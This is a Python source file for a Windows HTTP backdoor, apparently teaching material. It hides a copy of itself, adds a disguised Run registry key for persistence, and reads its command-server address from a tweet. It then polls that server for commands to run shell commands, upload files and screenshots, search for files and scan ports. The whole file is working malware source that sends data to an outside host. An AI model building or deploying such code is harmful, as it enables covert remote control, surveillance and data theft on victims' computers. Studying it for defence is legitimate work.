import os # need for getting working dir and search for file
import shutil # needed for file copying
import subprocess # needed for getting user profile
from _winreg import * # needed for editing registry
import ctypes # to edit file attributes (make file hidden)
import socket # for building TCP conneciton (port scanner)

import requests # Download Link https://pypi.python.org/pypi/requests#downloads
import time
import random
import string

from PIL import ImageGrab # used to Grab a screenshot
import tempfile # used to create a temp directory (to save screenshot until it got transfered)

from BeautifulSoup import BeautifulSoup as soupy # used to parse twitter html
import urllib # used to get html (twitter website)
import re # parse tweet

FILE_ATTRIBUTE_HIDDEN = 0x02


# function to create a random string
def randomword(length):
    return ''.join(random.choice(string.lowercase) for i in range(length))


# function to verify if our registry key is already there
def keyIsNotInReg():

    try:
        root_key = OpenKey(HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run\\', 0, KEY_READ)
        [Pathname,regtype] = (QueryValueEx(root_key,"RegHTTPClientUpdater"))
        CloseKey(root_key)
        if (""==Pathname):
            return True
        else:
            # everything is okay, means key is there can be read
            return False

    except WindowsError,e:
        # could not read, find key ...
        return True



# reconn phase

# get current working directory where the backdoor gets executed
# we use the output to build our source path
# could be sth like:
# C:\Windows\System32 or C:\Users\XY\Desktop\XY
path = os.getcwd().strip('/n')

# get user profile which contains the username, store in userprof var
# C:\Windows\System32>set USERPROFILE
# USERPROFILE=C:\Users\Max
Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')

# create random dest filename
random_string = randomword(6)
random_filename = random_string + '.exe'

# build dest path where we copy our backdor - we choose C:\Users\XY\Documents\
# destination = userprof.strip('\n\r') + '\\Documents\\' + random_filename
destination = userprof.strip('\n\r') + '\\AppData\\Local\\' + random_filename


# reconn phase 1 & 2

# verify if our script was run before and our backdoor was started via registry - if yes, no need to keep current backdoor
if keyIsNotInReg():
    
    # verify if our script was run before and our backdoor was copied to our destination
    if not os.path.exists(destination):

        # first time our backdoor gets executed
        # copy our backdoor to our destination
        shutil.copyfile(path + '\\persistence_http.exe', destination)

        # make file hidden
        if os.name == 'nt':
            # unicode string is needed
            ret = ctypes.windll.kernel32.SetFileAttributesW(unicode(destination, 'utf-8'), FILE_ATTRIBUTE_HIDDEN)

        # create registry key called Regupdater pointing to our  new backdoor path (destination)
        # we use HKEY_CURRENT_USER path, so we do not need admin priv
        key = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
        SetValueEx(key, 'RegHTTPClientUpdater', 0, REG_SZ, destination)
        key.Close()



# last phase is to start a reverse connection back to our machine

def connect(ip):
    while True: 

        # define user agent string in header (user agent: Windows 7-based PC using a Chrome browser)
        headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36'}
        
        req = requests.get('http://' + ip, headers=headers) # send GET request to our HTTP sever
        command = req.text # store the received txt into command variable
            
        if 'terminate' in command:
            break # end loop

        # Now similar to what we have done in our TCP reverse shell, we check if file exisit in the first place, if not then we 
        # notify our attacker that we are unable to find the file, but if the file is there then we will :-
        # 1.Append /store in the URL
        # 2.Add a dictionary key called 'file'
        # 3.requests library use POST method called "multipart/form-data" when submitting files

        #All of the above points will be used on the server side to distinguish that this POST is for submitting a file NOT a usual command output
        #Please see the server script for more details on how we can use these points to get the file

        # we want to have a file from the client
        elif 'grab' in command:

            grab, path = command.split('*')
            if os.path.exists(path):
                url = 'http://' + ip + '/store' # append /store in URL
                files = {'file': open(path, 'rb')} # add a dictionary key called 'file' where the key value is the file itself
                r = requests.post(url, files=files) # send the file and behind the scenes, requests lib use POST method called "multipart/form-data"

            else: # file does not exist
                post_response = requests.post(url='http://' + ip, data='[-] Not able to find the file!', headers=headers)


        # make screenshot
        elif 'screencap' in command:

            # create a temp dir to store our screenshot file
            # tempfile.mkdtemp() will create temp dir, e.g:
            # c:\users\max\appdata\local\temp\tmp7_nas_
            dirpath = tempfile.mkdtemp() 

            # create screencap and savie in temp dir
            ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")

            # transfer the file over our HTTP
            url = 'http://' + ip + '/store'                   
            files = {'file': open(dirpath + "\img.jpg", 'rb')}
            r = requests.post(url, files=files)
            
            files['file'].close()   # once the file gets transfered, close the file.
            shutil.rmtree(dirpath)  # remove our entire temp dir


        elif 'search' in command:
            # search command is "search C:\\*.pdf"

            # for the search itself we need the directory and the file extension
            command = command[7:] # output would be C:\\*.pdf
            path, ext = command.split('*') # split the command into two sections

            list = ''

            # os.walk walks recursive through file system
            for dirpath, dirname, files in os.walk(path):
                for file in files:
                    if file.endswith(ext):
                        list = list + '\n' + os.path.join(dirpath, file)

            requests.post(url='http://' + ip, data=list, headers=headers)


        # we want to to a 'low level' port scan
        elif 'scan' in command:
            # syntax for that command is "scan 10.10.10.10:21,22,80,123"
            command = command[5:] # cut the scan command
            ip, ports = command.split(':') # split the output into two sections, ip and list of ports

            scan_result = '' # var to store scan result

            for port in ports.split(','): # list or ports is separated by a comma
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    # to prevent "socket.error: [Errno 98] Address already in use" (socket is in a TIME_WAIT state)
                    # we set a flag to prevent this
                    # SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state, without waiting for its natural timeout to expire
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                    # try to connect to ip:port
                    # connect_ex returns 0 if operation is successfull, means, connection was established -> port is open
                    # Like connect(address), but return an error indicator instead of raising an exception for errors
                    output = sock.connect_ex((ip, int(port)))

                    if output == 0:
                        scan_result = scan_result + "[+] Port " + port + " is openend" + '\n'
                    else:
                        scan_result = scan_result + "[-] Port " + port + " is closed or Host is not reachable" + '\n'                

                    sock.close()

                except Exception, e:
                    pass

            requests.post(url='http://' + ip, data=scan_result, headers=headers)

        # we want to change the directory
        elif 'cd ' in command:
            # shell can not handle command like 'cd C:\Users\XY'

            # split command - we want to have the directory
            code, directory = command.split(' ')
            os.chdir(directory)
            post_response = requests.post(url='http://' + ip, data="[+] CWD is " + os.getcwd(), headers=headers)

        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            post_response = requests.post(url='http://' + ip, data=CMD.stdout.read(), headers=headers)  # POST the result 
            post_response = requests.post(url='http://' + ip, data=CMD.stderr.read(), headers=headers)  # or the error -if any-

        time.sleep(3)
    


def parseTwitterConnectionData():
    html = urllib.urlopen('https://twitter.com/d_schwenk').read()
    soup = soupy(html)

    x = soup.find("meta", {"name":"description"})['content']

    # x will be something like
    # Die neuesten Tweets von Daniel Schwenk (@d_schwenk): "hello from x"

    # use regex to get string (tweet) between '"'
    filter = re.findall(r'"(.*?)"',x)
    data = filter[0]

    # verify tweet / data contains ip and port (e.g. 192.168.100.100:8080)
    if re.search(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{4}', data):
        data = data.split(':')    
        ip = data[0]
        port = int(data[1])
        return(ip, port)
    else:
        # could not get tweet or parse it correctyl, return false values
        return(0, 0)


def main():

    # get attacker machine network config
    
    # assume our attacker uses a DDNS service, so we have to lookup the ip first
    # ip = socket.gethostbyname('attacker-machine.ddns.net')
    # ip = '192.168.100.187' # use static ip
    # print "Resolved IP (IP of attacker machine) is: " + ip

    # assume we twittered our connection stats
    ip, port = parseTwitterConnectionData()
    if ip == 0 and port == 0:
        # could not get any data from twitter, use hardcoded network stats
        ip = '192.168.100.187'
        port = 8080 # is here in that script not needed ...
    print "Resolved IP (IP:Port of attacker machine) is: %s:%s" % (ip, port)

    # infinite loop in that we try to connect to our host machine. if we got an exception (connection error),
    # then we sleep for a randowm time, pass the exception and try to establish a new connectoin
    while True:

        try:
            if connect(ip) == 1:
                break # end infinite loop and so the script

        except:
            sleep_for = random.randrange(1, 10)
            time.sleep(sleep_for) # sleep for a randowm time between 1-10 sec
            # time.sleep(sleep_for * 60) # sleep for a randowm time between 1-10 minutes
            pass


main()
